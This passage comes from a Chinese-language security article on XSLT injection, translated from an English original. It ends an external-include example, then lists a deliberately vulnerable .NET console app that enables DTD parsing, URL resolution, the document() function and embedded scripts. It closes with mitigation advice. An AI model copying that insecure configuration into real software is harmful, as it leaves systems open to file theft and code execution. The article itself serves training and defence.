style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;xsl:for-each select="fruit"&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!-- Print name: description --&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&lt;/xsl:for-each&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;/xsl:template&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&lt;xsl:include href="external_transform.xslt"/&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&lt;/xsl:stylesheet&gt;</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">转换执行后会产生如下输出：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: normal;">Hello from the external transformation</span></p><h1 style="margin-left: 8px;margin-right: 8px;"><br></h1><p><br></p><h1 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">一个易受 XSLT 攻击的 APP</span></strong></span></h1><hr><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">XSLT
 漏洞到此已经介绍完毕，但是想要写出一个在实际情景中能够奏效的利用漏洞的 &nbsp;XSLT 文档可能并不如想象中的那般容易，一方面因为要严格符合 
XML 的语法规范，另一方面是因为我们往往不能把握应用的实现细节。你可能在想，要是有个现成的应用让我练练手那该多好啊！</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">为此，我写了个小型的易受攻击的 .NET 控制台应用，可用于对其前面我们所介绍的攻击进行练习。该应用使用了 .NET 的 System.Xml 实现。源码已经贴在下面了，请使用微软的 Visual Studio 编译。源码和编译好的应用也可从</span><span style="font-size: 15px;letter-spacing: 2px;">这里</span><span style="font-size: 15px;letter-spacing: 2px;">下载。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">using System;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">using System.Xml;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">using System.Xml.Xsl;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">namespace XsltConsoleApplication</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;class Program</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This code contains serious vulnerabilities and is provided for training purposes only!</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DO NOT USE ANYWHERE FOR ANYTHING ELSE!!!</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;static void Main(string[] args)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("\n#####################################################################");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("# This is a Vulnerable-by-Design application to test XSLT Injection #");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("#####################################################################\n");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("The application expects (in the current working directory):");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(" - an XML file (data.xml) and\n - an XSLT style sheet (transform.xslt)\n");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine("===================================================================");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String transformationXsltFileURI = "transform.xslt";</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String dataXMLFileURI = "data.xml";</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Enable DTD processing to load external XML entities for both the XML and XSLT file</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XmlReaderSettings vulnerableXmlReaderSettings = new XmlReaderSettings();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableXmlReaderSettings.DtdProcessing = DtdProcessing.Parse;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableXmlReaderSettings.XmlResolver = new XmlUrlResolver();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XmlReader vulnerableXsltReader = XmlReader.Create(transformationXsltFileURI, vulnerableXmlReaderSettings);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XmlReader vulnerableXmlReader = XmlReader.Create(dataXMLFileURI, vulnerableXmlReaderSettings);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XsltSettings vulnerableSettings = new XsltSettings();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Embedded script blocks and the document() function are NOT enabled by default</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableSettings.EnableDocumentFunction = true;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableSettings.EnableScript = true;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// A vulnerable settings class can also be created with:</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// vulnerableSettings = XsltSettings.TrustedXslt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XslCompiledTransform vulnerableTransformation = new XslCompiledTransform();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// XmlUrlResolver is the default resolver for XML and XSLT and supports the file: and http: protocols</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XmlUrlResolver vulnerableResolver = new XmlUrlResolver();</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableTransformation.Load(vulnerableXsltReader, vulnerableSettings, vulnerableResolver);&nbsp; </span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XmlWriter output = new XmlTextWriter(Console.Out);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Run the transformation</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerableTransformation.Transform(vulnerableXmlReader, output);&nbsp;&nbsp; </span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">请确保你在当前工作目录下使用了名为 data.xml 和 transformation.xslt 的文件(请查看源码相应片段)。<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><h1 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">小小的建议</span></strong></span></h1><hr><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">如果你的应用中使用了 XSLT ，或许你可以从下面的指南中学到一些规避 XSLT 漏洞的方法。</span></p><ul style="margin-left: 8px;margin-right: 8px;" class=" list-paddingleft-2"><li><p><span style="font-size: 15px;letter-spacing: 2px;">尽可能避免使用用户所提供的 XSLT 文档。</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">不要使用不可信的输入来生成 XSLT 文档，例如连接字符串。如果必须要使用非静态值，则应将其包含在 XML 数据文件中，并且只能由 XSLT 文档引用。</span></p></li><li><p><span style="font-size: 15px;letter-spacing: 2px;">手动关闭正在使用的 XSLT 
库中所提供的一些有风险的功能，因为库的默认设置一般都不太安全。查查库手册学习一下如何关闭那些有风险的功能，例如：XML外部实体、document{}
 函数、import 和 include 标签。确保禁用了嵌入式脚本扩展，还有一些专有扩展所提供的允许读写外部文件的功能。</span></p></li></ul><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">推荐大家看一下这篇文章 </span><span style="font-size: 15px;letter-spacing: 2px;">XSLT Processing Security and Server Side Request Forgeries</span><span style="font-size: 15px;letter-spacing: 2px;"> ，作者是 Emanuel Duss 和 Roland Bischofberger 。这篇文章对于流行的 XSLT 库所实现的功能和每个库的默认设置做了一个很好的梳理，第34页还包含了一个对新手很友好的功能对比表格。<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;"><br></span></p><h1 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">总结</span></strong></span></h1><hr><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;letter-spacing: 2px;">XSLT
 
作为一个强大的工具被众多应用所使用，但是其脆弱的一面并不广为人知。一份糟糕的代码中很有可能隐藏了可被攻击者用来控制应用或窃取数据的漏洞。本文旨在通过展示一些可能受到的攻击来提高大家对于
 XSLT 的认识，同时提供了一点指引帮助大家避免中招一些写代码时比较常见的陷阱。<br></span></p><p><br></p><p><span style="font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;"></span></p><p><br></p><section label="Copyright © 2014 playhudong All Rights Reserved." style="max-width: 100%;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8G9B6YFlthnv1h3cWDDXGAmK9wQfy6pod114tTuOSIFVeVd0vd1PEwicksgBGmxL0iaC0icX7B9EQzNg/640?wx_fmt=png" style="margin-right: auto; margin-left: auto; display: block; box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 160px !important; height: 8.44575px !important;"></section><p><br></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">本文由看雪翻译小组<strong style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"> hesir </strong>编译，来源contextis@David Turco<br></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">转载请注明来自看雪社区</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 1.75em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">热门阅读</span></p><ul style="list-style-type: disc;" class=" list-paddingleft-2"><li><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 1.75em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;font-size: 14px;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286402&amp;idx=3&amp;sn=6eac85d87908e1ee132b09e852c17682&amp;chksm=b18149c886f6c0de5efeb852f59c670353c5331f4fbbafccddd809a53e0d0d11c5bb237ac5f1&amp;scene=21#wechat_redirect" target="_blank">颠覆windows的信任体系——实现任意代码签名劫持（一）</a><br></span></p></li><li><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 1.75em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;font-size: 14px;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286463&amp;idx=1&amp;sn=1137608cdc0b058a9e75908401480e5b&amp;chksm=b18149f586f6c0e31bf8aa8e67e623a5145cd733b1e52a19abf82db52584e986c582295331e6&amp;scene=21#wechat_redirect" target="_blank">颠覆windows的信任体系——实现任意代码签名劫持（二）</a><br></span></p></li><li><p style="margin: 15px 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 1.75em;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;font-size: 14px;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286508&amp;idx=2&amp;sn=af9023058af5967d9291a91eabca5215&amp;chksm=b181492686f6c0309aebd5320b3b4c9942029571b0bffa3583b1d32cd89a34f71e74b25ac3e1&amp;scene=21#wechat_redirect" target="_blank">颠覆windows的信任体系——实现任意代码签名劫持（三）</a><br></span></p></li></ul><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">点击阅读原文/read，</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;">更多干货等着你~</span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8HTpGlibXdQ4YIynJnSjWwOjSroH8JkP00Cpl0TvGwSCibJpPmSmcartSbQUfodq49ulaLk1Yicrem3A/640?wx_fmt=jpeg" style="box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 542px !important; height: 136.065px !important;"></p><p><br></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1512886045&src=3&ver=1&signature=0dsH*cvrb7sDcdE*f0PtKJTfSmWmpGSr1bt6eLQusWUeX1D3PeY-hy0sLVqqzj8ewzefSEoH9llGPntsMnS0FIKMmDeGcGLmapBR446RN5fzYue*AVLrZE9uHepPAMYFY7RrunWBnGvy1sLLtXBFrY2fMoYD05LwvFo4HtaRyXQ=">微信地址</a> | <a href="https://bbs.pediy.com/thread-222921.htm">阅读原文</a>
{% endraw  %}

